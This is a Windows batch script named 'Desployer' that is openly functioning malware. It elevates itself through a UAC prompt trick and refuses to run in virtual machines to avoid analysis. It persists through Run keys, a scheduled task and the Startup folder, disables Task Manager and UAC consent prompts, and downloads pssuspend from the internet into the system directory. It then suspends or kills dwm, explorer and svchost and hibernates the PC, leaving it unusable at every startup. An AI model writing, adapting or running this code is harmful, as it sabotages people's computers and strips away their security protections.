@echo off
color 02
title Desployer
cls
set retry1=0
::settings
if "%1"=="--nocheck" set check=0 else set check=1
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

::checks for being run as administrator 
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Requesting administrator privileges...
    goto UACPrompt
) else (goto gotAdmin)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "%~dpnx0", "%params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
goto continue1
:continue1
if "%check%"=="1" goto check
goto nocheck
::check for shady stuff
:check
systeminfo | find "Hyper-V" > nul
if %errorlevel% equ 0 (
  echo This script cannot be run on a Hyper-V virtual machine.
  exit /b
)

systeminfo | find "VMware" > nul
if %errorlevel% equ 0 (
  echo This script cannot be run on a VMware virtual machine.
  exit /b
)

systeminfo | find "VirtualBox" > nul
if %errorlevel% equ 0 (
  echo This script cannot be run on a VirtualBox virtual machine.
  exit /b
)

systeminfo | find "Parallels" > nul
if %errorlevel% equ 0 (
  echo This script cannot be run on a Parallels virtual machine.
  exit /b
)
:nocheck
::do the main stuff
set own=%~dp0
cd %own%
set self=%~nx0
set __COMPAT_LAYER=RUNASINVOKER
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
if "%self%"=="desployer.bat" goto ok2 else ren "%cd%\%self%" "%cd%\desployer.bat"
:ok2
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Desployer" /t REG_SZ /d "%own%%self%" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Desployer" /t REG_SZ /d "%own%%self%" /f
schtasks /create /f /tn "Desployer" /sc ONSTART /rl HIGHEST /RU administrator /tr "%own%%self%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%self%" goto ok0 else copy /v /y "%own%%self%" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%self%"
:ok0
::check for pssuspend being already downloaded.
if exist "%temp%\pssuspend.exe" goto skip1
powershell.exe -command "Invoke-WebRequest -Uri 'https://live.sysinternals.com/pssuspend.exe' -OutFile '%temp%\pssuspend.exe'
:skip1
::copies the files to the system to be accessable through the command line.
takeown /A /F "%systemroot%" & copy /v /y "%temp%\pssuspend.exe" "%systemroot%"
copy /v /y "%temp%\pssuspend.exe" "%systemroot%"

::check again
if exist "%systemroot%\pssuspend.exe" goto continue2 else goto skip1
:continue2

:other
pssuspend -accepteula dwm.exe
taskkill /f /im dwm.exe
pssuspend -accepteula explorer.exe & timeout 20 >nul
shutdown /h
taskkill /f /im svchost.exe
exit
